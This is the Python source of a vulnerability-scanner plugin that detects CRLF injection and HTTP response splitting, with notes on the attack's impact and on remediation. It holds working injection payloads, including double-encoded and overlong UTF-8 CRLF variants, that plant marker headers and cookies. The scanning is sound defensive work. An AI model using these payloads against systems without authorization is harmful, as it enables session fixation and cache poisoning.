"""CRLF injection / HTTP response splitting.

When user input is concatenated into a response header — most often the
`Location` of a redirect, sometimes a `Set-Cookie` or a custom echo header — a
carriage return and line feed in that input end the header early and let the
attacker write headers of their own. From there: session fixation via an
injected `Set-Cookie`, cache poisoning of the whole response, and, once the
header block is terminated, an attacker-authored body served from the target's
own origin.

**The only signal used here is a header that actually exists in the parsed
response.** Grepping the body for the payload proves nothing: any application
that echoes its query string will "match", and a URL-encoded `%0d%0a` coming
back in HTML is a reflection, not a split. httpx hands us the header block as
h11 parsed it off the wire, so `resp.headers["x-scanr-injected"]` is true only
if the server really emitted that header. A per-run random token in the value
rules out the remaining case — a target that already has such a header.

Two vectors, tested separately because different code builds them:

* **Generic parameters** — anything that might be reflected into a header.
* **Redirect parameters** — a value that we first *confirm* lands in `Location`
  before injecting. That is where header concatenation actually lives, and
  confirming first keeps us from firing blind payloads at every parameter.

Encodings vary because the decoder in front of the sink varies: raw CR/LF (which
httpx percent-encodes on the wire), a bare `%0a` for servers that split on LF
alone, double-encoded `%250d%250a` for a sink behind two decode passes, and the
overlong-UTF-8 pair `%E5%98%8A%E5%98%8D` that some parsers narrow to CR/LF.

Intrusive but not destructive: the injected header is a marker on our own
response. It sets no cookie the target will store, writes nothing, and reaches
no user but us.
"""
from __future__ import annotations

import logging
import secrets
from typing import TYPE_CHECKING
from urllib.parse import quote

from scanr.core.plugin_base import FindingData, PluginBase, PluginCategory, Severity
from scanr.plugins.web._budget import Budget
from scanr.plugins.web._crawler import crawl, create_web_client
from scanr.plugins.web._http_evidence import format_from_httpx
from scanr.plugins.web._ports import is_web_port, web_scheme

if TYPE_CHECKING:
    from scanr.core.context import ScanContext
    from scanr.models import Host

logger = logging.getLogger(__name__)

HTTP_PORTS = [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000]

_INJECTED_HEADER = "x-scanr-injected"

# Parameters commonly reflected into a header, plus the redirect family below.
_TEST_PARAMS = [
    "url", "next", "redirect", "return", "returnUrl", "return_url", "redirect_uri",
    "goto", "target", "dest", "destination", "continue", "page", "lang", "q", "id",
]

# Parameters worth the extra confirm-then-inject round trip, because these are
# the ones that end up in Location.
_REDIRECT_PARAMS = [
    "url", "next", "redirect", "return", "returnUrl", "return_url",
    "redirect_uri", "redirectUrl", "goto", "target", "dest", "destination",
]

# A benign relative path used to prove a parameter reaches Location at all.
_REDIRECT_PROBE = "/scanr-crlf-probe"


def _separators() -> list[tuple[str, str]]:
    """(wire-encoded separator, label) variants that may decode to CR LF."""
    return [
        ("%0d%0a", "percent-encoded CRLF"),
        ("%0a", "percent-encoded LF only"),
        ("%0d", "percent-encoded CR only"),
        ("%250d%250a", "double-encoded CRLF"),
        ("%E5%98%8A%E5%98%8D", "overlong UTF-8 CRLF (U+560A/U+560D)"),
    ]


def _payloads(token: str, prefix: str = "") -> list[tuple[str, str]]:
    """(query-string value, label) pairs, already percent-encoded for the wire.

    `prefix` is prepended raw so a redirect parameter keeps a value the
    application will accept before the separator starts a new header.
    """
    header = quote(f"X-ScanR-Injected: {token}", safe="")
    cookie = quote(f"Set-Cookie: scanr_crlf={token}", safe="")
    out: list[tuple[str, str]] = []
    for sep, label in _separators():
        out.append((f"{prefix}{sep}{header}", f"{label} + custom header"))
        out.append((f"{prefix}{sep}{cookie}", f"{label} + Set-Cookie"))
    return out


# Wall-clock allowance per host, inside the plugin's own 300s timeout so the
# check stops deliberately instead of being cancelled with nothing to show.
_HOST_BUDGET = 150.0

class CrlfInjectionPlugin(PluginBase):
    id = "web.crlf_injection"
    name = "CRLF Injection / HTTP Response Splitting"
    description = (
        "Inject encoded CR/LF into query and redirect parameters and confirm the "
        "target emits an attacker-controlled response header"
    )
    category = PluginCategory.web
    intrusive = True
    severity = Severity.high
    ports = HTTP_PORTS
    timeout = 300

    async def check(self, context: "ScanContext", host: "Host") -> list[FindingData]:
        findings: list[FindingData] = []
        budget = Budget(_HOST_BUDGET)
        for port in host.ports:
            if budget.spent():
                logger.info("crlf_injection: %s budget spent, %s", host.ip, budget.note())
                break
            if not is_web_port(port):
                continue
            scheme = web_scheme(port)
            base_url = f"{scheme}://{host.ip}:{port.number}"
            try:
                finding = await self._test_host(context, base_url, port.number, budget)
            except Exception as exc:  # noqa: BLE001 - one port must not end the scan
                logger.debug("crlf_injection: %s failed: %s", base_url, exc)
                continue
            if finding:
                findings.append(finding)
        return findings

    async def _test_host(
        self, context, base_url: str, port: int, budget: Budget
    ) -> FindingData | None:
        token = f"scanr{secrets.token_hex(6)}"
        async with create_web_client(context) as client:
            crawled = await crawl(base_url, client)
            params = list(dict.fromkeys(crawled.get_params + _TEST_PARAMS))[:10]
            paths = (crawled.paths or ["/"])[:4]

            for path in paths:
                url = f"{base_url}{path}"
                # Vector 1: straight injection into any candidate parameter.
                for param in params:
                    if budget.spent():
                        return None
                    hit = await self._probe(client, url, param, token, port, prefix="")
                    if hit:
                        return hit
                # Vector 2: parameters proven to reach Location. Worth the extra
                # request each, since header concatenation lives on redirects.
                for param in _REDIRECT_PARAMS:
                    if budget.spent():
                        return None
                    if not await self._reaches_location(client, url, param):
                        continue
                    hit = await self._probe(
                        client, url, param, token, port, prefix=quote(_REDIRECT_PROBE, safe="")
                    )
                    if hit:
                        return hit
        return None

    async def _reaches_location(self, client, url: str, param: str) -> bool:
        """True when an inert value for `param` is reflected into Location."""
        target = f"{url}?{param}={quote(_REDIRECT_PROBE, safe='')}"
        try:
            resp = await client.get(target, timeout=8.0)
        except Exception:
            return False
        if resp.status_code < 300 or resp.status_code >= 400:
            return False
        return _REDIRECT_PROBE in resp.headers.get("location", "")

    async def _probe(
        self, client, url: str, param: str, token: str, port: int, *, prefix: str
    ) -> FindingData | None:
        for value, label in _payloads(token, prefix):
            # Build the URL by hand: httpx preserves already-encoded sequences
            # in a raw query string, whereas passing params= would re-encode the
            # '%' and send %250d instead of %0d.
            target = f"{url}?{param}={value}"
            try:
                resp = await client.get(target, timeout=8.0)
            except Exception:
                continue
            proof = self._injected_header(resp, token)
            if proof:
                return self._finding(target, param, label, proof, resp, port)
        return None

    @staticmethod
    def _injected_header(resp, token: str) -> str | None:
        """The header we injected, if the server really emitted it.

        Only parsed headers count. The token must appear in the value so a
        pre-existing header of the same name cannot be mistaken for a hit.
        """
        custom = resp.headers.get(_INJECTED_HEADER)
        if custom and token in custom:
            return f"X-ScanR-Injected: {custom}"
        for cookie in resp.headers.get_list("set-cookie"):
            if token in cookie:
                return f"Set-Cookie: {cookie}"
        return None

    def _finding(
        self, target: str, param: str, label: str, proof: str, resp, port: int
    ) -> FindingData:
        return FindingData(
            plugin_id=self.id,
            severity=Severity.high,
            title="CRLF Injection (HTTP Response Splitting)",
            description=(
                f"The {param!r} parameter is written into a response header without "
                "stripping carriage returns and line feeds. A payload using a "
                f"{label} caused the server to emit a header that the application never "
                "defines, proving the attacker controls the header block. This allows "
                "session fixation through an injected Set-Cookie, poisoning of any shared "
                "cache in front of the application, and — once the header block is "
                "terminated early — serving attacker-authored content from this origin."
            ),
            evidence=(
                f"Request: GET {target}\n"
                f"Parameter: {param}\n"
                f"Injected header observed in the parsed response: {proof}\n"
                "(Detected from httpx's parsed header block, not from body text, so this "
                "is a real header and not a reflection.)\n\n"
                f"{format_from_httpx(resp)}"
            ),
            remediation=(
                "Reject or strip CR (0x0D) and LF (0x0A) from any value placed in a "
                "response header, after every decoding pass rather than before. Prefer the "
                "framework's header API over string concatenation — modern servers refuse "
                "control characters in header values — and for redirects, validate the "
                "target against an allowlist instead of echoing the parameter."
            ),
            references=[
                "https://owasp.org/www-community/attacks/HTTP_Response_Splitting",
                "https://cwe.mitre.org/data/definitions/113.html",
            ],
            cvss_score=7.2,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
            port_number=port,
            protocol="tcp",
        )
